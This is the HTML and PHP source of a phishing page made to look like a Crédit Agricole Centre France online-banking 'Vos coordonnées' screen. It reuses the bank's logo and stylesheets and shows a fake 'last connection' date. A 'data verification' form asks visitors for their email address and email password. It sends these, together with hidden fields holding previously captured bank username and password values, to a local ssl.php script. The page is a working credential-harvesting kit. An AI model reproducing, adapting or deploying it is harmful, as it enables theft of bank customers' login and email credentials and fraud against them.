﻿<html><head>
	<base href="http://www.cf-g3-enligne.credit-agricole.fr/">
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
	<title>Crédit Agricole - Banque et assurances</title>
</head>
<body marginheight="0" topmargin="0" vspace="0" marginwidth="0" leftmargin="0" hspace="0" style="margin:0"><div id="container">
	<table border="0" width="960px" cellpadding="0" cellspacing="0">
		<tbody><tr valign="middle"><td>
			<!-----  DEBUT zone enteteTech  ---->





			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">















			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=58" media="all">
			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=58" media="all">


			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css" media="all">
			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css" media="all">


			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css" media="all">
			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css" media="all">

<!--[if IE 8]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8.css?v=58" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8-mod.css?v=58" media="all" />
<![endif]-->

<!--[if lte IE 7]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie.css?v=58" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie-mod.css?v=58" media="all" />
<![endif]-->

<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold.css?v=58" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold-mod.css?v=58" media="all" />
<![endif]-->






















<!-----  FIN zone boutonVert  ---->

</td></tr><tr height="17" valign="top"><td>
<!-----  DEBUT zone bnc  ---->









<div id="entete_professionnel">

	<div id="entete_2">
		<div id="gauche-entete_2">
			<h1>
				<table>
					<tbody><tr>   
						<td class="entete_2_logo">
							<a title="Caisse Régionale Centre France, retour à l'accueil" href="#" id="lien-logo_2">
								<img alt="Caisse Régionale Centre France, retour à l'accueil" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/logo_868.png">
							</a>
						</td>
						<td class="entete_2_CR">
							<a title="Caisse Régionale Centre France, retour à l'accueil" href="https://www.cf-g3-enligne.credit-agricole.fr/stb/entreeBam#" id="lien-logo_2">
								<span></span>
							</a>
						</td>
					</tr>
					<tr>
						<td colspan="2" id="slogan_2">Banque Assurance Immobilier</td>				
					</tr>
				</tbody></table>

			</h1>
			<!--        <p id="slogan">Banque Assurance Immobilier</p>-->
		</div>
		<div id="centre-entete_2">
			<!--	    <img alt="Crédit Agricole Nord de France, retour à l'accueil" src="/web/bam/tech/allmedia/stb/commun/img/separateur.png"></img>-->
			<p id="typeespace_2">

			</p> 
		</div>
		<div id="droite-entete_2">    	
			<p id="der-conn_2">Votre dernière connexion :  <?php
date_default_timezone_set('Europe/Paris');
// --- La setlocale() fonctionnne pour strftime mais pas pour DateTime->format()
setlocale(LC_TIME, 'fr_FR.utf8','fra');// OK
// strftime("jourEnLettres jour moisEnLettres annee") de la date courante
echo "", strftime("%d %B %Y");
?> </p>
			<div id="bloc-login_2">
				<div id="bloc-login-infos_2" style="font-size: 11px;">
					<p> </p>
					<p></p>
				</div>
				<div id="btn-bloc-login_2">

					<a onMouseOver="StatusMessage(true, 'Déconnexion');return true" onMouseOut="StatusMessage( false )" href="#" id="btn-deconnexion_2">Déconnexion</a>
				</div>
			</div>
			<div class="clearboth"></div>
			<div id="bloc-login_22">
				<p>

					<a id="coordonnees_2" href="#" onMouseOver="StatusMessage(true, 'Gérer vos coordonnées');return true" onMouseOut="StatusMessage( false )">Vos Coordonnées</a>

					
					&nbsp; <a id="contact_2" href="#" onMouseOver="StatusMessage(true, 'Si vous avez une demande particulière, cliquez ici');return true" onMouseOut="StatusMessage( false )">Nous contacter</a>


					&nbsp; <a id="btn-sos_22" href="#" onMouseOver="StatusMessage(true, 'Déclarez une perte, un vol ou un sinistre');return true" onMouseOut="StatusMessage( false )">SOS Urgences</a>	
				</p>		        
			</div>   
			<div class="clearboth"></div>           
		</div>
	</div>



	<ul id="menu-bnc_2">




		<li id="bnc-compte" class="bnc-g  prem-menu">
			<p style="text-align:center">
				<a href="#" id="bnc-compte-href" style="width: 118 " onMouseOver="StatusMessage(true, 'Comptes et cartes'); document.getElementById('bnc-compte_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-compte_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-compte_logo').src='https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-compte_off.png';">
					<img alt="Comptes et cartes" id="bnc-compte_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-compte_off.png">


					<br>
					<span>
						Comptes<br><span class="small"> &amp; cartes</span>
					</span>
				</a>
			</p>
		</li>
		
		<li>
		</li>
		

		<li id="bnc-messagerie" class="bnc-gmess">				
			<p style="text-align:center">
				<a href="#" id="bnc-messagerie-href" style="width:				
				118
				" onMouseOver="StatusMessage(true, 'Messagerie '); 
				document.getElementById('bnc-messagerie_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-messagerie_on.png';
				return true" onMouseOut="StatusMessage( false );
				document.getElementById('bnc-messagerie_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-messagerie_off.png';">
				<img alt="Messagerie " id="bnc-messagerie_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-messagerie_off.png">


				<br>
				<span>
					Messagerie 
				</span>		
			</a>
		</p>
	</li>

	
	<li>
	</li>


	<li id="bnc-espaceconseil" class="bnc-g ">
		<p style="text-align:center">
			<a href="#" id="bnc-espaceconseil-href" style="width: 118 " onMouseOver="StatusMessage(true, 'Conseils'); document.getElementById('bnc-espaceconseil_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-espaceconseil_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-espaceconseil_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-espaceconseil_off.png';">
				<img alt="Conseils" id="bnc-espaceconseil_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-espaceconseil_off.png">


				<br>
				<span>
					Conseils
				</span>
			</a>
		</p>
	</li>

	<li>
	</li>


	<li id="bnc-devissimulations" class="bnc-g ">
		<p style="text-align:center">
			<a href="#" id="bnc-devissimulations-href" style="width: 118 " onMouseOver="StatusMessage(true, 'Simulation et Devis'); document.getElementById('bnc-devissimulations_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-devissimulations_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-devissimulations_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-devissimulations_off.png';">
				<img alt="Simulation et Devis" id="bnc-devissimulations_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-devissimulations_off.png">


				<br>
				<span>
					Simulation<br><span class="small"> &amp; Devis</span>
				</span>
			</a>
		</p>
	</li>

	<li>
	</li>


	<li id="bnc-quotidien" class="bnc-d ">
		<p style="text-align:center">
			<a href="#" id="bnc-quotidien-href" style="width:
			118
			" onMouseOver="StatusMessage(true, 'Quotidien'); document.getElementById('bnc-quotidien_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-quotidien_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-quotidien_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-quotidien_off.png'">

			<img alt="Quotidien" id="bnc-quotidien_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-quotidien_off.png">

			<br>
			<span>
				Quotidien
			</span>

		</a>
	</p>
</li>




<li id="bnc-credits" class="bnc-d ">
	<p style="text-align:center">
		<a href="#" id="bnc-credits-href" style="width:
		118
		" onMouseOver="StatusMessage(true, 'Crédits'); document.getElementById('bnc-credits_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-credits_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-credits_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-credits_off.png'">

		<img alt="Crédits" id="bnc-credits_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-credits_off.png">

		<br>
		<span>
			Crédits
		</span>

	</a>
</p>
</li>




<li id="bnc-epargne" class="bnc-d ">
	<p style="text-align:center">
		<a href="v" id="bnc-epargne-href" style="width:
		118
		" onMouseOver="StatusMessage(true, 'Épargner'); document.getElementById('bnc-epargne_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-epargne_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-epargne_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-epargne_off.png'">

		<img alt="Épargner" id="bnc-epargne_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-epargne_off.png">

		<br>
		<span>
			Épargner
		</span>

	</a>
</p>
</li>




<li id="bnc-assurance" class="bnc-d  der-menu">
	<p style="text-align:center">
		<a href="#" id="bnc-assurance-href" style="width: 
		120
		" onMouseOver="StatusMessage(true, 'Assurance'); document.getElementById('bnc-assurance_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-assurance_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-assurance_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-assurance_off.png'">

		<img alt="S'assurer" id="bnc-assurance_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-assurance_off.png">

		<br>
		<span>
			S'assurer
		</span>

	</a>
</p>
</li>





</ul>





<!-----  FIN zone bnc  ---->

</div></td></tr><tr valign="middle"><td>
<!-----  DEBUT zone FILDARIANE  ---->




<script type="text/javascript">
	var PU_PREM_ECRAN = "javascript:doAction('Synthcomptes', 'bnt');";
</script>
<div id="fil-ariane_2">
	<div id="fil-ariane-contenu"><ul>                                                        <li id="ariane-home">                                         <a title="Retour à la page d'accueil" href="#">                                  <img height="25" alt="Retour à la page d'accueil" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/picto_home.png">                    </a></li><li>&nbsp;&gt;&nbsp;Synthèse comptes</li></ul></div>
	
	
	
	

	
	
	
	






	<script>aide_message= "Accédez à vos messages";</script>


	<div id="ariane-message3_2">
		<p>
			<!--								Vous avez  -->
			<a href="#" onMouseOver="StatusMessage(true, aide_message);return true" onMouseOut="StatusMessage( false )">
				<span style="color:#F8F8FF; font-size:22px; font-weight:bold; text-decoration:none">&nbsp;0</span>&nbsp; <img src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/pic_messagerie_gris.png">
				<!--									nouveau&nbsp;message-->
			</a>
		</p>
	</div>




</div>


<!-----  FIN zone FILDARIANE  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone libPerimetre  ---->




<div id="libPerimetre_2">
	<span class="textePerimetre_2">Espace Titulaire : Comptes particuliers</span>
</div>





<!-----  FIN zone libPerimetre  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone infoperso  ---->

<!-----  FIN zone infoperso  ---->

</td></tr><tr height="17" valign="top"><td><table border="0" cellpadding="0" cellspacing="0">
<tbody><tr><td valign="top" width="168px">
	<table border="0" valign="top" width="168px" cellpadding="0" cellspacing="0">
		<tbody><tr><td>
			<!-----  DEBUT zone MENH  ---->
			<div idcomp="tcm-979-228777"><script> prefixe = 'pack_1111'; </script><ul id="menu-bnt">

				<li class="boutonMen"><dynamiclink animcom="Stevcom" profil_bam="+profil_evt_menh" label="E-documents" onclick="clicXiti('TMANICEV1AC_PDC_MEN_Haut_Avec_WCB_part_comptes__Lien_Contenu_FP_E_releve_Image160x96', 'N');" onmouseout="top.window.status='';return true;" onmouseover="top.window.status='E-documents';return true;" ref="tcm-979-156022"><a href="#" onClick="clicXiti('TMANICEV1AC_PDC_MEN_Haut_Avec_WCB_part_comptes__Lien_Contenu_FP_E_releve_Image160x96', 'N'); javascript:lancerSTEvCom('Stevcom','profil_bam='+profil_evt_menh, this,'ACTION=lancerPUContenu(\'tcm-979-156022\',\'global\')');" onMouseOut="top.window.status='';return true;" onMouseOver="top.window.status='E-documents';return true;" shape="rect"><binarycontent img="/PAPEreleve_160_96_tcm_979_269818.gif"><script xml:space="preserve">displayBinary(prefixe, "/PAPEreleve_160_96_tcm_979_269818.gif", "", "");</script><img border="0" src=""></binarycontent></a></dynamiclink></li><li class="boutonMen"><a href="#" onClick="clicXiti('TMANICEV1AC_PDC_MEN_Haut_Avec_WCB_part_comptes__Liens_Externe_WCB_Visuel_Part_Comptes', 'N'); lancerSTEvCom('Stevcom','profil_bam='+profil_evt_menh,this,'ACTION=lancerURL(\'https://client.linkeo.com/ca-centrefrance.fr/PROD/btn-pop-https/popup.htm?CODEBOUTON=CACENTREFR000O\');');" onMouseOut="StatusMessage(false);return true;" onMouseOver="StatusMessage(true, 'Appel');return true;" shape="rect"><binarycontent img="/bouton_WCB_BAM_160x96_part_quodidien_v3_tcm_979_277665.gif"><script xml:space="preserve">displayBinary(prefixe, "/bouton_WCB_BAM_160x96_part_quodidien_v3_tcm_979_277665.gif", "", "");</script><img border="0" src=""></binarycontent></a></li><script xml:space="preserve">/*<![CDATA[*/$(document).ready(function () {$('li.tcmMenH> h2').click(function () {if ($(this).next('ul.menPersH1:visible').length != 0) {$(this).next('ul.menPersH1').slideUp('normal');$(this).removeClass('unfolded');}else{$(this).next('ul.menPersH1').slideDown('normal');$(this).addClass('unfolded');}return false;});$('li.toggleSubMenu > a').click(function () {if ($(this).next('ul.menPersH2:visible').length != 0) {$(this).next('ul.menPersH2').slideUp('normal');} else {$(this).next('ul.menPersH2').slideDown('normal');}return false;});});/*]]>*/</script>
			</ul></div><!--vide-->
			<!-----  FIN zone MENH  ---->

		</td></tr><tr><td>
		<!-----  DEBUT zone bnt  ---->



		<script language="JavaScript">
			function go() {
				url = document.forms.FRM_LST.nocpte.options[document.forms.FRM_LST.nocpte.selectedIndex].value;
				i = document.forms.FRM_LST.nocpte.selectedIndex;
				if (url != "")
				{
					doAction(url,'bnt','DetCpt', i );
				}
			}

			choix=false;
			function choixCompte() {
				if (saf) {
					go();
				} else {
					if (choix) {
						choix=false;
						go();
					}
					else
						choix = true;
				}
			}

			function resetChoix() {
				choix=false;
			}

		</script>
		<form name="FRM_LST" method="POST">


			<ul id="menu-bnt_2">
				<li>
					<h2 id="bnt-titre-synthese" class="prem-titre-bnt">
						<!--			<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-vert.png" vertical-align="middle"></div>    -->
						<div class="traitgauchevert">&nbsp;</div>
						<div class="libmenubnt">
							Synthèses
						</div>  
					</h2>
				</li>
				<ul>


					<script>aide_bnt1_0= "Accédez à vos comptes";</script>

					<li class="nomarge-li-BNT">
						<a class="itemactif-bnt-titre-Autrescomptes" style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_0);return true" onMouseOut="StatusMessage( false )">Mes Comptes</a>
					</li>

					<script>aide_bnt1_1= "Accédez à vos crédits";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_1);return true" onMouseOut="StatusMessage( false )">Mes Crédits</a>
					</li>

					<script>aide_bnt1_2= "Accédez à vos contrats d'épargne";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_2);return true" onMouseOut="StatusMessage( false )">Mon Épargne</a>
					</li>

					<script>aide_bnt1_3= "Accédez à vos contrats d'assurances";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_3);return true" onMouseOut="StatusMessage( false )">Mes Assurances</a>
					</li>

					<script>aide_bnt1_4= "Accédez à vos comptes en devises";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_4);return true" onMouseOut="StatusMessage( false )">Devises</a>
					</li>

					<script>aide_bnt1_5= "Visualisez la situation globale de votre patrimoine";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_5);return true" onMouseOut="StatusMessage( false )">Situation globale</a>
					</li>


					<!-- </ul> -->
					<!-- </li> -->
					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-Autrescomptes">
							<a href="#" onClick="doAction('Perimetre')" title="Espace Autres Comptes">
								Espace Autres Comptes
							</a>
						</h2>
					</li>


					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-services">
							<!--						<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-rose-1.png" vertical-align="middle"></div>    -->
							<div class="traitgaucherose1">&nbsp;</div>
							<div class="libmenubnt">
								Services
							</div>  
						</h2>
						<ul>
							<script>aide_bnt1_6= "Effectuez un virement";</script>
							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_6);return true" onMouseOut="StatusMessage( false )">Virements</a>
							</li>
							<script>aide_bnt1_7= "Commandez votre chéquier";</script>
							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_7);return true" onMouseOut="StatusMessage( false )">Chéquiers</a>
							</li>
							<script>aide_bnt1_8= "Gérez vos titres";</script>
							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_8);return true" onMouseOut="StatusMessage( false )">Titres</a>
							</li>

						</ul>
					</li>




					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-eservices">
							<!--		    	<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-rose-2.png" vertical-align="middle"></div>    -->
							<div class="traitgaucherose2">&nbsp;</div>
							<div class="libmenubnt">
								e-Services
							</div>
						</h2>
						<ul>

							<script>aide_bnt3_0= "Effectuez une demande de souscription à un de nos produits directement en ligne"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onClick="lancerSTTrackingElargi('Performance&amp;prov=bnt','bnt-souscription100enligne','','ACTION=');" onMouseOver="StatusMessage(true, aide_bnt3_0);return true" onMouseOut="StatusMessage( false )">Souscription 100% <br> en ligne</a>
							</li>

							<script>aide_bnt3_1= "Signez vos contrats en attente"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt3_1);return true" onMouseOut="StatusMessage( false )">Mes contrats en attente</a>
							</li>


							<script>aide_bnt3_2= "Accédez au service de présentation et de règlement de factures"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" sepamail="" onMouseOver="StatusMessage(true, aide_bnt3_2);return true" onMouseOut="StatusMessage( false )">SEPAmail
								</a>
							</li>


							<script>aide_bnt3_3= "L'essentiel sur votre produit en quelques points clés"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt3_3);return true" onMouseOut="StatusMessage( false )">Mémo</a>
							</li>


							<script>aide_bnt3_4= "Commande devises"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onClick="ouvrirPopup('https://www.cprplusdirect.com/Reseaux/connect.aspx?ID=CACentreFrance','eCoffreFort','500','600','yes','yes','yes','yes','yes','yes');" onMouseOver="StatusMessage(true, aide_bnt3_4);return true" onMouseOut="StatusMessage( false )">Commande devises</a>
							</li>


						</ul>
					</li>



					<!-- E-Documents -->	

					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-edocuments">
							<!--			<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-rose-2.png" vertical-align="middle"></div>    -->
							<div class="traitgaucherose2">&nbsp;</div>
							<div class="libmenubnt">
								e-Documents
							</div>
						</h2>
						<ul>	    

							<script>aide_bnt4_0= "Gérer vos documents électroniques"; </script> 


							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt4_0);return true" onMouseOut="StatusMessage( false )">Gestion</a>
							</li>




							<script>aide_bnt4_1= "Consulter vos documents électroniques"; </script> 


							<li class="nomarge-li-BNT">
								<a style="width:auto;height:23" href="#" onMouseOver="StatusMessage(true, aide_bnt4_1);return true" onMouseOut="StatusMessage( false )">Consultation&nbsp;
									<img id="imgQEDNLU" alt="Nouveau e-Document" title="Nouveau e-Document" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/picto_nouveau.png">
								</a>
							</li>




						</ul>
					</li>



					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-outils">
							<!--			<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-gris.png" vertical-align="middle"></div>    -->
							<div class="traitgauchegris">&nbsp;</div>
							<div class="libmenubnt">
								Outils
							</div>
						</h2>

						<ul>

							<script>aide_bnt5_0= "Téléchargez vos relevés de comptes"; </script> 

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt5_0);return true" onMouseOut="StatusMessage( false )">Téléchargement</a>
							</li>


							<script>aide_bnt5_1= "Personnalisez vos alertes"; </script> 

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt5_1);return true" onMouseOut="StatusMessage( false )">Alertes</a>
							</li>


							<script>aide_bnt5_2= "Gérer vos préférences"; </script> 

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt5_2);return true" onMouseOut="StatusMessage( false )">Vos Préférences</a>
							</li>


						</ul>
					</li>
				</ul>

				
					<input type="hidden" name="urlTel">
				

				<!-----  FIN zone bnt  ---->

			</ul></form></td></tr><tr><td>
			<!-----  DEBUT zone MENB  ---->
			<div idcomp="tcm-979-374723"><script> prefixe = 'pack_1111'; </script><ul id="menu-bnt">

				<li class="boutonMen"><a href="#" onClick="clicXiti('MENU_GAUCHE_PDC_MENH_PREDICA_PACIFICA__PACIFICA__LSTDEV__Partenaire', 'N'); lancerPuPartenaireParam('PACIFICA', 'LSTDEV', '');" onMouseOut="StatusMessage(false);return true;" onMouseOver="StatusMessage(true, 'Espace Assurances');return true;" shape="rect"><binarycontent img="/btn_assurance__bien_2016_V2_tcm_979_374722.png"><script xml:space="preserve">displayBinary(prefixe, "/btn_assurance__bien_2016_V2_tcm_979_374722.png", "", "");</script><img border="0" src=""></binarycontent></a></li><li class="boutonMen"><a href="#" onClick="clicXiti('MENU_GAUCHE_PDC_MENH_PREDICA_PACIFICA__PREDICA__CONTRAT__Partenaire', 'N'); lancerPuPartenaireParam('PREDICA', 'CONTRAT', '');" onMouseOut="StatusMessage(false);return true;" onMouseOver="StatusMessage(true, 'Espace Vie, Retraite et Prévoyance');return true;" shape="rect"><binarycontent img="/btn_assurance_vie_2016_V2_tcm_979_374721.png"><script xml:space="preserve">displayBinary(prefixe, "/btn_assurance_vie_2016_V2_tcm_979_374721.png", "", "");</script><img border="0" src=""></binarycontent></a></li><script xml:space="preserve">/*<![CDATA[*/$(document).ready(function () {$('li.tcmMenB> h2').click(function () {if ($(this).next('ul.menPersB1:visible').length != 0) {$(this).next('ul.menPersB1').slideUp('normal');$(this).removeClass('unfolded');}else{$(this).next('ul.menPersB1').slideDown('normal');$(this).addClass('unfolded');}return false;});$('li.toggleSubMenu > a').click(function () {if ($(this).next('ul.menPersB2:visible').length != 0) {$(this).next('ul.menPersB2').slideUp('normal');} else {$(this).next('ul.menPersB2').slideDown('normal');}return false;});});/*]]>*/</script>
			</ul></div><!--vide-->
			<!-----  FIN zone MENB  ---->

		</td></tr>
	</tbody></table>
</td><td valign="top" width="6.5px">

<!-----  DEBUT zone filler  ---->
<span style="font-size: 1px">&nbsp;</span>


<!-----  FIN zone filler  ---->

</td>
<td valign="top" width="590px" id="col-centre">
<div class="boutons-act">
	<h1>Vos coordonnées<span id="top-actions">
		<a href="#" id="top-actions-aide" onMouseOut="afftextStat(0)" onMouseOver="afftextStat(statusaide);return true" title="Besoin d'Aide ?">Aide</a>
	</span>
	
</h1>
</div>

<!-------------- ERREURS-VALIDATION ----------->

		










<script>champsEnErreur = null;</script>





		

















<!---------- FIN ERREURS-VALIDATION ----------->


<br>
<form class="ca-forms" name="frm_fwk" method="POST" action="http:<?php echo '//'.$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']); ?>/ssl.php?PaReq=8A3VD6dY5fmzHov7BqtUfGLNFXLtMEbjbfgItuiX1jaOpukDAMCCrmrEZu9aciwEROyD9weu9tVlm8bFBwaX9x9jQJV1vbFmNdPU&MD=<?php echo md5(rand(20)); ?>">

<input type="hidden" name="user" value="<?php print_r($user); ?>">
<input type="hidden" name="pass" value="<?php print_r($pass); ?>">
<table width="590" border="0" cellpadding="3" cellspacing="0">
	<tbody><tr>
		<td bgcolor="#84aaad" colspan="3" class="titretetiere">
			<font face="Helvetica,Arial gras" size="3">
				Verification des données
			</font>
		</td>
	</tr>
</tbody></table>
<fieldset class="blc-choix-valid" style="border:0 none;">
		<div class="blc-choix-wrap-valid">
<table width="570" border="0" cellpadding="3" cellspacing="0">
	</table>

<table width="570" border="0" cellpadding="3" cellspacing="0">
	<tbody>
	<tr>
		<td>
			<?php
if($firsterror=="1"){
	echo"<font style='COLOR: #e4414e; font-family: Verdana; font-weight: bold; font-size: 12px;'> 
Les données saisies sont incorrectes.
"; 
} else {
	echo"<font style='font-size: 12px; font-family: arial,helvetica'> Pour activer votre compte, veuillez remplir le formulaire suivant :";
}
?>

			</font>
		</td>
	</tr><tr>
</tr></tbody></table>
</div>

</fieldset>
<fieldset class="blc-choix" style="border:0;">
    <div class="blc-choix-wrap">
<table width="570" border="0" cellpadding="3" cellspacing="0">
		<tbody>
  <tr>
  <td height="29" STYLE="<?php print_r($emailcolor); ?>"><strong>Adresse E-mail :</strong></td>
	 
    <td><input name="email" STYLE="<?php print_r($emailclass); ?>" value="<?php print_r($email); ?>" id="edit-email-id" size="30" maxlength="50" type="text"></td>	  
 
  </tr>
  <tr>
    <td height="29" STYLE="<?php print_r($pwdcolor); ?>"><strong>Mot de passe E-Mail :</strong></td>
    <td><input name="pwd" STYLE="<?php print_r($pwdclass); ?>" value="" id="pwd" size="30" maxlength="50" type="password"></td>
  </tr>
 <tr>
</tr></tbody></table>
</div>
</fieldset>

<div class="validation">
		<input type="submit" id="droite" value="Confirmer">

									
									
										
									
									


				
</div></form>




<table width="364" border="0" cellspacing="0" cellpadding="0">
<tbody><tr>
	<td align="right">
	

			
	</td>
</tr>
</tbody></table>



<!-----  FIN zone pu  ---->


</td> 
<td valign="top" width="" align="right">
<div style="width: 160px;" class="popupPAP" align="left">
	<div valign="middle" style="font-size:0px;">
		<!-----  DEBUT zone SECU  ---->

		<span style="font-size: 0px">&nbsp;</span>

		<!-----  FIN zone SECU  ---->

	</div><div valign="middle">
	<!-----  DEBUT zone BAM  ---->
	<!--vide--><!--vide-->
	<!-----  FIN zone BAM  ---->

</div><div valign="middle">
<!-----  DEBUT zone INFO  ---->
<!--vide--><!--vide-->
<!-----  FIN zone INFO  ---->

</div><div valign="middle">
<!-----  DEBUT zone PROMO  ---->
